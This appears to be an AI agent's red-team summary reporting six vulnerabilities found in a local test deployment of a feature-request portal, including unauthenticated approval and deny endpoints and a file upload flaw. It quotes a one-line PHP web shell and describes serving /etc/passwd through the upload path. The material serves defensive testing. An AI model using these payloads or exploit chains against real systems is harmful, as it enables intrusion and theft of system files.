---

## 🔴 Red Team — Active Exploitation Complete

**6 confirmed breaches** against the live ephemeral environment (`docker-compose.test.yml` → `localhost:3001`). All four mission objectives achieved, plus one critical net-new finding.

---

### ⚠️ Scope Note
The pen-tester analyzed `Source/Backend/` (work-items domain) but the test container runs the **portal backend** (feature-requests/bugs/cycles domain). The same vulnerability classes from PEN-001–PEN-013 were confirmed active in the running target.

---

## Confirmed Breaches

### 🔴 RED-001 — Unauthenticated Force-Approve Bypasses AI Assessment Pipeline (Critical)
**Based on:** PEN-001 + PEN-007  
**Chain:** `POST /api/feature-requests` → `PATCH /:id {"status":"voting"}` → `POST /:id/force-approve`  
**Result:** FR-0001 moved `potential → voting → approved` with **zero agent votes**, `human_approval_approved_at` set. The entire AI voting pipeline skipped. No credentials required at any step.

---

### 🔴 RED-002 — Arbitrary File Upload + Public Exfiltration (Critical — Net New)
**Based on:** PEN-001 + A08 (upload MIME validation trusts client header)  
**Chain:** Upload `/etc/passwd` with `type=image/jpeg` → served at `/uploads/<uuid>.jpg`  
**Result:** 
- `http://localhost:3001/uploads/6939ae6b…jpg` → **returns `/etc/passwd` contents** live
- `http://localhost:3001/uploads/44bee227…jpg` → **returns `<?php system($_GET["cmd"]); ?>`**

Root cause: `multer` fileFilter checks `file.mimetype` (the multipart `Content-Type` header the attacker controls), not actual file magic bytes. Any file content can be uploaded and is publicly served at `/uploads/`.

---

### 🟠 RED-003 — Ghost Dependency Permanent DoS (High)
**Based on:** PEN-009  
**Chain:** Add FR-0005 as blocker of approved FR-0004 → `DELETE /api/feature-requests/FR-0005` → FR-0004 permanently enters `pending_dependencies` with no recovery path via API.  
**Leak:** `GET /:id/ready` response reveals soft-deleted item IDs in `unresolved_blockers`.

---

### 🟠 RED-004 — Unauthenticated Deny Sabotage During Voting (High)
**Based on:** PEN-001 + PEN-007  
**Chain:** `POST /api/feature-requests/FR-0008/deny {"comment":"DENIED BY UNAUTHORIZED SABOTEUR"}`  
**Result:** FR in voting status killed with no auth. `denied` is a terminal state — the feature cannot be recovered. Any actor with network access can permanently kill any feature in the voting pipeline.

---

### 🟠 RED-005 — Full Dataset Enumeration, No Pagination Cap (High)
**Based on:** PEN-005  
**Chain:** `GET /api/feature-requests?limit=999999` + `GET /api/dashboard/activity?limit=999999`  
**Result:** Entire dataset returned in one unauthenticated request. No server-side limit enforcement.

---

### 🟡 RED-006 — Unauthenticated Prometheus Metrics (Medium)
**Based on:** PEN-008  
**Result:** `GET /metrics` returns full operational telemetry (transition rates, voting invocations, upload counts, process memory/CPU) with no auth.

---

Results appended to `Teams/TheGuardians/artifacts/attack-surface-map.md` under `## Red Team Results`. Learnings written to `Teams/TheGuardians/learnings/red-teamer.md`.
